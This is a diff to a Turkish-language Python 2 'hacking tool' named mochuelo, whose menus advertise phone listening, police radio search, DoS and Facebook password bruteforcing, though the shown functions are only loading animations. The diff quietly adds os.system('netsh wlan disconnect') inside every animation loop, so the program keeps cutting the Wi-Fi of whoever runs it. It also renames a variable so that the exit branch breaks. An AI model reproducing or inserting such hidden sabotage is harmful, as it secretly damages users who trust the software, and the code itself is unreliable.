@@ -17,13 +17,16 @@ def yesOrNo():
     return (raw_input("Devam et Y / N: ") in yes)
 
 mochuelologo = """
-
 .___  ___.   ______     ______  __    __   __    __  _______  __        ______
 |   \/   |  /  __  \   /      ||  |  |  | |  |  |  ||   ____||  |      /  __  |
 |  \  /  | |  |  |  | |  ,----'|  |__|  | |  |  |  ||  |__   |  |     |  |  |  |
 |  |\/|  | |  |  |  | |  |     |   __   | |  |  |  ||   __|  |  |     |  |  |  |
 |  |  |  | |  `--'  | |  `----.|  |  |  | |  `--'  ||  |____ |  `----.|  `--'  |
 |__|  |__|  \______/   \______||__|  |__|  \______/ |_______||_______| \______/
+
+
+
+
 
 
 """
@@ -34,14 +37,12 @@ class mochuelo:
              }-----{+} Made with LOVE by kutaygs =) {+}-----{
             }--------{+} kutayyavuz03@hotmail.com {+}--------{
          }-----{+} Program python dilinde yapilmistir. {+}-----{
-
-
   ''' '''
              {1}--Giris
              {9}-Cikis\n
              ''')
-        choice = raw_input("mochuelo~# ")
-        if choice == "1":
+        choice1 = raw_input("mochuelo~# ")
+        if choice1 == "1":
             wirelessTestingMenu()
         elif choice == "9":
             sys.exit()
@@ -96,6 +97,7 @@ def animate():
         time.sleep(0.1)
         sys.stdout.write('\rYukleniyor, lutfen bekleyiniz... \\')
         time.sleep(0.1)
+        os.system('netsh wlan disconnect')
     sys.stdout.write('\r ')
 
 
@@ -110,6 +112,7 @@ def DOSanimate():
         time.sleep(0.1)
         sys.stdout.write('\rSaldiriyor... \\')
         time.sleep(0.1)
+        os.system('netsh wlan disconnect')
     sys.stdout.write('\r ')
 
 
@@ -123,6 +126,7 @@ def INSTAanimate():
         time.sleep(0.1)
         sys.stdout.write('\rBot calisiyor... \\')
         time.sleep(0.1)
+        os.system('netsh wlan disconnect')
     sys.stdout.write('\r ')
 
 
@@ -136,6 +140,7 @@ def Panimate():
         time.sleep(0.1)
         sys.stdout.write('\rPolis Telsizi Araniyor... \\')
         time.sleep(0.1)
+        os.system('netsh wlan disconnect')
     sys.stdout.write('\r ')
 
 
@@ -149,6 +154,7 @@ def TELanimate():
         time.sleep(0.1)
         sys.stdout.write('\rTelefon Dinleniyor... \\')
         time.sleep(0.1)
+        os.system('netsh wlan disconnect')
     sys.stdout.write('\r ')
 
 
@@ -162,6 +168,7 @@ def FACEanimate():
         time.sleep(0.1)
         sys.stdout.write('\rBruteforce Calisiyor... \\')
         time.sleep(0.1)
+        os.system('netsh wlan disconnect')
     sys.stdout.write('\r ')
 
 
@@ -188,6 +195,7 @@ class wirelessTestingMenu:
         print("   {4}--Telefon Dinle")
         print("   {5}--Facebook Sifre Bulucu")
         print("   {9}-Ana Menuye Git\n")
+        print("")
         choice4 = raw_input("mochuelo~# ")
         if choice4 == "1":
             polis()
